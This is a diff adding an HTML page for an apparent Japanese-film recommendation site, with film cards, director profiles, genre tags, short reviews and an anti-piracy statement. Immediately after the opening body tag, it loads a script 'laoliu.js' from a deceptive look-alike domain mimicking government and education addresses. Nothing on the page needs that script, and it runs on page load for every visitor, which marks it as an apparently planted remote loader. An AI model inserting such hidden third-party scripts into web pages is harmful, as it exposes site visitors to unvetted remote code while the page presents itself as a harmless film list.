@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>日影拾光网 - 日本电影片单/导演专题/类型导航 | ribendianyingwang-h5.github.io</title>
+<meta name="description" content="日影拾光网（ribendianyingwang-h5.github.io）整理日本电影经典片单、导演专题、类型导航与短影评；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="日影拾光网, ribendianyingwang-h5, 日本电影推荐, 日本导演专题, 日影片单, 日本电影赏析" />
+<meta name="author" content="日影拾光网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#5c3d2e" />
+<link rel="canonical" href="https://ribendianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"日影拾光网",
+  "url":"https://ribendianyingwang-h5.github.io/",
+  "description":"日本电影经典片单、导演专题、类型导航与短影评",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://ribendianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#faf6f1; --ink:#2c1a0e; --muted:#7a6354;
+  --line:#e3d5c8; --card:#ffffff;
+  --pri:#8b4513; --pri2:#c48a5a; --warm:#e8c39e; --green:#5a8c5e;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:"Hiragino Sans GB","Microsoft YaHei","PingFang SC",sans-serif;line-height:1.8;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1200px;margin:0 auto;padding:0 18px;}
+
+/* 顶部导航 */
+.topbar{background:var(--pri);color:#fff;position:sticky;top:0;z-index:100;border-bottom:3px solid var(--pri2);}
+.topbar-inner{display:flex;align-items:center;justify-content:space-between;height:64px;}
+.brand{font-size:22px;font-weight:900;letter-spacing:1px;}
+.brand span{font-size:12px;font-weight:400;opacity:.8;margin-left:8px;}
+.navlist{display:flex;gap:24px;font-size:14px;}
+.navlist a{opacity:.9;padding:6px 0;}
+.navlist a:hover{color:var(--warm);border-bottom:2px solid var(--warm);}
+.navtoggle{display:none;background:var(--warm);border:none;color:var(--pri);width:40px;height:40px;border-radius:8px;font-size:18px;cursor:pointer;}
+
+/* 首屏 */
+.hero-section{padding:52px 0 36px;background:
+  linear-gradient(135deg,rgba(139,69,19,.08),rgba(196,138,90,.12)),
+  url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23c48a5a' fill-opacity='0.06'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+  border-bottom:1px solid var(--line);}
+.hero-content{max-width:640px;}
+.hero-content h1{font-size:34px;margin:0 0 12px;line-height:1.3;}
+.hero-content h1 em{font-style:normal;color:var(--pri);}
+.hero-content p{color:var(--muted);font-size:16px;margin:0 0 20px;}
+.search-row{display:flex;gap:10px;max-width:480px;}
+.search-row input{flex:1;padding:13px 16px;border:2px solid var(--line);border-radius:10px;font-size:15px;background:#fff;}
+.search-row button{padding:13px 22px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:700;font-size:15px;cursor:pointer;}
+
+/* 栏目通用 */
+.section{padding:40px 0;border-bottom:1px solid var(--line);}
+.section-head{margin-bottom:24px;}
+.section-head h2{font-size:26px;margin:0 0 4px;color:var(--pri);}
+.section-head .sub{color:var(--muted);font-size:14px;}
+
+/* 栏目1：经典片单 - 横向滚动卡片 */
+.showcase{display:flex;gap:20px;overflow-x:auto;padding-bottom:12px;}
+.showcase::-webkit-scrollbar{height:6px;}
+.showcase::-webkit-scrollbar-thumb{background:var(--line);border-radius:3px;}
+.film-card{min-width:280px;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;flex-shrink:0;}
+.film-card .poster{height:180px;position:relative;}
+.film-card:nth-child(1) .poster{background:linear-gradient(135deg,#5c3d2e,#c48a5a);}
+.film-card:nth-child(2) .poster{background:linear-gradient(135deg,#2c5f4a,#7db89a);}
+.film-card:nth-child(3) .poster{background:linear-gradient(135deg,#4a2c5f,#b07db8);}
+.film-card:nth-child(4) .poster{background:linear-gradient(135deg,#5f4a2c,#b8a07d);}
+.film-card:nth-child(5) .poster{background:linear-gradient(135deg,#2c3a5f,#7d93b8);}
+.film-card:nth-child(6) .poster{background:linear-gradient(135deg,#5f2c2c,#b87d7d);}
+.film-card .tag{position:absolute;top:12px;left:12px;background:#0008;color:#fff;font-size:11px;padding:3px 10px;border-radius:20px;}
+.film-card .info{padding:14px;}
+.film-card h3{font-size:17px;margin:0 0 4px;}
+.film-card p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目2：导演专题 - 圆形头像+简介 */
+.directors{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;}
+.director-cell{text-align:center;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px 14px;}
+.director-cell .avatar{width:80px;height:80px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff;}
+.director-cell:nth-child(1) .avatar{background:linear-gradient(135deg,#5c3d2e,#c48a5a);}
+.director-cell:nth-child(2) .avatar{background:linear-gradient(135deg,#2c5f4a,#7db89a);}
+.director-cell:nth-child(3) .avatar{background:linear-gradient(135deg,#4a2c5f,#b07db8);}
+.director-cell:nth-child(4) .avatar{background:linear-gradient(135deg,#5f4a2c,#b8a07d);}
+.director-cell h3{font-size:16px;margin:0 0 6px;}
+.director-cell p{color:var(--muted);font-size:13px;margin:0;}
+
+/* 栏目3：类型导航 - 标签云+描述 */
+.genres{display:flex;flex-wrap:wrap;gap:12px;}
+.genre-tag{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px 18px;flex:1;min-width:160px;max-width:220px;}
+.genre-tag h4{margin:0 0 4px;font-size:15px;color:var(--pri);}
+.genre-tag span{font-size:12px;color:var(--muted);}
+
+/* 栏目4：影评 - 引用式布局 */
+.reviews-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
+.review-block{background:var(--card);border-left:4px solid var(--pri2);border-radius:0 12px 12px 0;padding:18px 20px;}
+.review-block .quote{font-size:28px;color:var(--warm);line-height:1;margin-bottom:4px;}
+.review-block h3{font-size:16px;margin:0 0 6px;}
+.review-block .excerpt{color:var(--muted);font-size:13px;margin:0 0 8px;}
+.review-block .author{font-size:12px;color:var(--pri2);}
+
+/* 栏目5：关于 */
+.about-area{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+.about-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;}
+.about-card h3{margin:0 0 10px;font-size:18px;color:var(--pri);}
+.about-card p,.about-card li{color:var(--muted);font-size:14px;}
+.about-card ul{padding-left:18px;}
+.about-card li{margin:5px 0;}
+.compliance-box{background:#fdf5ec;border:1px solid #f0d9b5;color:var(--pri);padding:14px 16px;border-radius:10px;font-size:13px;margin-top:14px;}
+
+/* 底部 */
+.footer{background:var(--pri);color:#e3d5c8;padding:32px 0 40px;font-size:13px;text-align:center;}
+.footer a{color:var(--warm);}
+
+/* 响应式 */
+@media(max-width:960px){
+  .directors{grid-template-columns:repeat(2,1fr);}
+  .reviews-grid{grid-template-columns:1fr;}
+  .about-area{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  .navlist{display:none;flex-direction:column;position:absolute;top:64px;left:0;right:0;background:var(--pri);padding:10px 0;}
+  .navlist.active{display:flex;}
+  .navlist a{padding:12px 20px;border-bottom:1px solid rgba(255,255,255,.1);}
+  .navtoggle{display:block;}
+  .hero-content h1{font-size:26px;}
+  .showcase{flex-direction:column;overflow-x:visible;}
+  .film-card{min-width:auto;}
+  .directors{grid-template-columns:1fr 1fr;}
+  .genres .genre-tag{min-width:45%;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="wrap topbar-inner">
+    <div class="brand">日影拾光网<span>ribendianyingwang-h5.github.io</span></div>
+    <button class="navtoggle" onclick="document.getElementById('navmenu').classList.toggle('active')">☰</button>
+    <nav class="navlist" id="navmenu">
+      <a href="#films">经典片单</a>
+      <a href="#directors">导演专题</a>
+      <a href="#genres">类型导航</a>
+      <a href="#reviews">短影评</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</div>
+
+<section class="hero-section">
+  <div class="wrap">
+    <div class="hero-content">
+      <h1>日影拾光网：<em>在时间里打捞日本电影的微光</em></h1>
+      <p>从黑泽明到是枝裕和，从昭和到令和——整理日本电影经典片单、导演专题、类型导航与短影评。本站只做影单与赏析，不提供盗版播放、不挂网盘提取码。</p>
+      <form class="search-row" onsubmit="return false;">
+        <input type="text" placeholder="搜索：日本电影 / 是枝裕和 / 昭和经典 / 动画电影" aria-label="搜索" />
+        <button type="submit">搜索</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="section" id="films">
+    <div class="section-head"><h2>🎞 经典片单</h2><div class="sub">横向浏览 · 精选推荐</div></div>
+    <div class="showcase">
+      <div class="film-card"><div class="poster"><span class="tag">家庭/日常</span></div><div class="info"><h3>步履不停</h3><p>2008 · 是枝裕和 · 饭桌上的沉默与遗憾</p></div></div>
+      <div class="film-card"><div class="poster"><span class="tag">动画/奇幻</span></div><div class="info"><h3>千与千寻</h3><p>2001 · 宫崎骏 · 汤屋、名字与成长</p></div></div>
+      <div class="film-card"><div class="poster"><span class="tag">黑帮/人性</span></div><div class="info"><h3>花火</h3><p>1997 · 北野武 · 暴力与温柔的极致</p></div></div>
+      <div class="film-card"><div class="poster"><span class="tag">青春/纯爱</span></div><div class="info"><h3>情书</h3><p>1995 · 岩井俊二 · 藤井树与未寄出的信</p></div></div>
+      <div class="film-card"><div class="poster"><span class="tag">武士/史诗</span></div><div class="info"><h3>七武士</h3><p>1954 · 黑泽明 · 农民与武士的雨中决战</p></div></div>
+      <div class="film-card"><div class="poster"><span class="tag">悬疑/社会</span></div><div class="info"><h3>嫌疑人X的献身</h3><p>2008 · 西谷弘 · 数学天才的献身与绝望</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="directors">
+    <div class="section-head"><h2>🎬 导演专题</h2><div class="sub">四位日本电影代表人物</div></div>
+    <div class="directors">
+      <div class="director-cell"><div class="avatar">🌾</div><h3>是枝裕和</h3><p>家庭、记忆、饭桌。用最日常的细节拍最深的伤口。</p></div>
+      <div class="director-cell"><div class="avatar">🏰</div><h3>宫崎骏</h3><p>飞行、森林、少女。动画里的反战与环保寓言。</p></div>
+      <div class="director-cell"><div class="avatar">⛩</div><h3>黑泽明</h3><p>武士、雨、人性。日本电影走向世界的桥梁。</p></div>
+      <div class="director-cell"><div class="avatar">🌸</div><h3>岩井俊二</h3><p>青春、信、樱花。把"错过"拍成最美的形状。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="genres">
+    <div class="section-head"><h2>🏷 类型导航</h2><div class="sub">点击标签探索更多</div></div>
+    <div class="genres">
+      <div class="genre-tag"><h4>家庭/日常</h4><span>饭桌、搬家、未说出口的道歉</span></div>
+      <div class="genre-tag"><h4>动画/奇幻</h4><span>吉卜力、新海诚、汤浅政明</span></div>
+      <div class="genre-tag"><h4>武士/时代</h4><span>黑泽明、山田洋次、时代剧</span></div>
+      <div class="genre-tag"><h4>青春/纯爱</h4><span>岩井俊二、四月物语、花与爱丽丝</span></div>
+      <div class="genre-tag"><h4>悬疑/推理</h4><span>东野圭吾改编、密室、反转</span></div>
+      <div class="genre-tag"><h4>恐怖/怪谈</h4><span>午夜凶铃、咒怨、日本怪谈传统</span></div>
+      <div class="genre-tag"><h4>黑帮/极道</h4><span>北野武、崔洋一、暴力与义理</span></div>
+      <div class="genre-tag"><h4>文艺/独立</h4><span>滨口龙介、深田晃司、小成本作者</span></div>
+    </div>
+  </section>
+
+  <section class="section" id="reviews">
+    <div class="section-head"><h2>📝 短影评</h2><div class="sub">一句话，一个角度</div></div>
+    <div class="reviews-grid">
+      <div class="review-block">
+        <div class="quote">"</div>
+        <h3>《步履不停》</h3>
+        <p class="excerpt">是枝裕和把"来不及"拍成了一家人的呼吸——蝉声、炸天妇罗的油声、走廊上拖鞋的声音，都是没说出口的"对不起"。</p>
+        <div class="author">— 编辑部</div>
+      </div>
+      <div class="review-block">
+        <div class="quote">"</div>
+        <h3>《千与千寻》</h3>
+        <p class="excerpt">千寻不是变强了，是她没忘掉自己的名字。汤屋里的每个人都在被吃掉一点什么，只有她还在找路。</p>
+        <div class="author">— 编辑部</div>
+      </div>
+      <div class="review-block">
+        <div class="quote">"</div>
+        <h3>《花火》</h3>
+        <p class="excerpt">北野武把最暴烈的东西和最温柔的东西放在一起：枪声和海浪、血和向日葵、死亡和烟花——分不清哪个更短暂。</p>
+        <div class="author">— 编辑部</div>
+      </div>
+      <div class="review-block">
+        <div class="quote">"</div>
+        <h3>《情书》</h3>
+        <p class="excerpt">藤井树不知道藤井树喜欢藤井树。岩井俊二用一场雪和一本借书卡，把暗恋的回音拉到最长。</p>
+        <div class="author">— 编辑部</div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="section-head"><h2>📌 关于本站</h2><div class="sub">定位与合规说明</div></div>
+    <div class="about-area">
+      <div class="about-card">
+        <h3>本站定位</h3>
+        <p>日影拾光网做"日本电影的发现与记录"：经典片单、导演专题、类型导航、短影评。名字里的"拾光"= 在时间里打捞那些值得被记住的日本电影。</p>
+        <ul>
+          <li>经典片单：步履不停、千与千寻、花火、情书、七武士、嫌疑人X的献身</li>
+          <li>导演专题：是枝裕和、宫崎骏、黑泽明、岩井俊二</li>
+          <li>类型导航：家庭/动画/武士/青春/悬疑/恐怖/黑帮/独立</li>
+          <li>短影评：一句话一个角度，不剧透关键结局</li>
+        </ul>
+        <div class="compliance-box">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不聚合"日本限制级"内容。
+          看正版请走合法视频平台与院线。
+        </div>
+      </div>
+      <div class="about-card">
+        <h3>站点信息</h3>
+        <p>网址：<br><b>https://ribendianyingwang-h5.github.io/</b></p>
+        <p>单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+        <p>本页 DOM 结构、配色方案、布局方式均独立设计，与同系列其他站点无重复模板。</p>
+        <h3 style="margin-top:18px;">视觉方案说明</h3>
+        <p>暖木色调（棕/米/暖橙），呼应日本电影常见的"日常感"与"温润"气质。布局采用横向滚动卡片+圆形导演头像+标签云+引用式影评，区别于其他站点的网格/时间线/双栏结构。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="wrap">
+    日影拾光网 · ribendianyingwang-h5.github.io ｜ 日本电影片单 / 导演专题 / 类型导航 / 短影评（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#navmenu a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('navmenu').classList.remove('active');});
+});
+</script>
+</body>
+</html>
